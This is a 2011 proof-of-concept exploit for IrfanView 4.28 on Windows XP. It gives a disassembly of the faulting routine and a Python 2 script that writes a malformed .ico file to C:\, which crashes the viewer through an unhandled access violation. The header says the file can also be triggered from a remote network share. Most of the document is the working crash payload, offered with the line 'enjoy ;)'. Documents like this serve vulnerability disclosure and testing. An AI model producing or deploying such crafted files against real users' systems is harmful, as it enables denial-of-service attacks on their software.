# done by BraniX <branix@hackers.org.pl>
# www.hackers.org.pl
# found: 2011.04.07
# published: 2011.04.10
# tested on: Windows XP SP3 Home Edition
# tested on: Windows XP SP3 Professional

# App: IrfanView 4.28
# App Url: http://www.irfanview.com
# i_view32.exe MD5: c6d9383c4119a59aad70dbc4a974b8b4

# DoS is caused by not handled Access Violation Exception in module i_view32.exe

# It can be triggered from:
# Local: C:\With Transparent Colour - DoS.ico
# Remote: \\MySecretServer\With Transparent Colour - DoS.ico

# 004162D0    8B4424 04       MOV EAX,DWORD PTR SS:[ESP+4]
# 004162D4    B2 80           MOV DL,80
# 004162D6    8AC8            MOV CL,AL
# 004162D8    53              PUSH EBX
# 004162D9    80E1 07         AND CL,7
# 004162DC    D2EA            SHR DL,CL
# 004162DE    8B4C24 0C       MOV ECX,DWORD PTR SS:[ESP+C]
# 004162E2    C1E8 03         SHR EAX,3
# 004162E5    8A1C08          MOV BL,BYTE PTR DS:[EAX+ECX]             ; Invalid address -> Access Violation when reading
# 004162E8    22D3            AND DL,BL
# 004162EA    5B              POP EBX
# 004162EB    F6DA            NEG DL
# 004162ED    1BD2            SBB EDX,EDX
# 004162EF    F7DA            NEG EDX
# 004162F1    8BC2            MOV EAX,EDX
# 004162F3    C3              RETN

filepath = "C:\\With Transparent Colour - DoS.ico"
f = open(filepath, "wb")
poc = '\x00\x00\x01\x00\x01\x00\x0B\x0D\x00\x00\x01\x00\x18\x00\x30\x02\x00\x00\x16\x00\x00\x00\x28\x00\x00\x00\xFE\x00\x00\x00\x1A\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1E\x17\x14\x00\x00\x00\x00\x00\x00\x2D\x26\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x35\x27\x24\x36\x33\x35\x2C\x33\x4B\x2C\x33\x4B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3F\x39\x48\x48\x54\x67\x33\x29\x34\x36\x33\x35\x2C\x33\x4B\x44\x46\x65\x00\x00\x00\x36\x33\x35\x56\x58\x76\x64\x67\x87\x35\x44\x4D\x1E\x17\x14\x64\x67\x87\x65\x78\x96\x35\x27\x24\x36\x33\x35\x2C\x33\x4B\x48\x54\x67\x00\x00\x00\x27\x34\x33\x65\x78\x96\x65\x78\x96\x48\x54\x67\x56\x55\x67\x77\x76\x98\x44\x44\x56\x25\x24\x24\x3F\x39\x48\x44\x44\x56\x48\x54\x67\x00\x00\x00\x44\x44\x56\x44\x46\x65\x36\x33\x35\x67\x66\x77\x65\x59\x90\x67\x66\x99\x56\x55\x67\x25\x24\x24\x3F\x39\x48\x44\x44\x56\x44\x46\x65\x00\x00\x00\x77\x69\xCA\x56\x58\x76\x44\x35\x2F\x77\x76\x98\x76\x6B\x98\x77\x76\x98\x34\x46\x2E\x25\x26\x37\x2C\x33\x4B\x3F\x39\x48\x48\x54\x67\x00\x00\x00\x65\x59\x90\x44\x44\x56\x55\x49\x65\x51\x47\x46\x55\x56\x58\x34\x46\x2E\x36\x33\x35\x36\x33\x35\x2C\x33\x4B\x2C\x33\x4B\x47\x56\x76\x00\x00\x00\x75\x69\x88\x55\x49\x65\x52\x55\x8B\x46\x43\x44\x36\x33\x35\x44\x44\x56\x44\x44\x56\x3F\x39\x48\x3F\x39\x48\x3F\x39\x48\x56\x58\x76\x00\x00\x00\x67\x66\x77\x44\x44\x56\x55\x49\x65\x55\x49\x65\x56\x58\x76\x65\x59\x90\x55\x49\x65\x3F\x39\x48\x33\x29\x34\x3F\x39\x48\x56\x58\x76\x00\x00\x00\x55\x49\x65\x55\x49\x65\x55\x49\x65\x65\x59\x90\x67\x66\x99\x65\x59\x90\x55\x49\x65\x3F\x39\x48\x33\x29\x34\x44\x44\x56\x64\x67\x87\x00\x00\x00\x4F\x49\x56\x55\x49\x65\x55\x49\x65\x56\x55\x67\x65\x59\x70\x64\x67\x87\x56\x58\x76\x3F\x39\x48\x2C\x33\x4B\x44\x46\x65\x54\x69\x8C\x00\x00\x00\x55\x49\x65\x55\x49\x65\x55\x49\x65\x55\x49\x65\x65\x59\x90\x65\x59\x90\x55\x49\x7A\x3F\x39\x48\x3F\x39\x48\x56\x58\x76\x65\x78\x96\x00\x00\x00\x65\x59\x90\x56\x58\x76\x52\x55\x8B\x65\x59\x90\x6C\x58\xB0\x67\x66\x99\x52\x55\x8B\x3F\x39\x48\x2C\x33\x4B\x56\x58\x76\x77\x8F\xAB\x00\x00\x00\x6E\x00\x00\x00\xF8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
f.write(poc)
f.close()

print "Done, 1 file generated on 'C:\\' ..."
print "Open this file in IrfanView 4.28 and enjoy ;)"


    
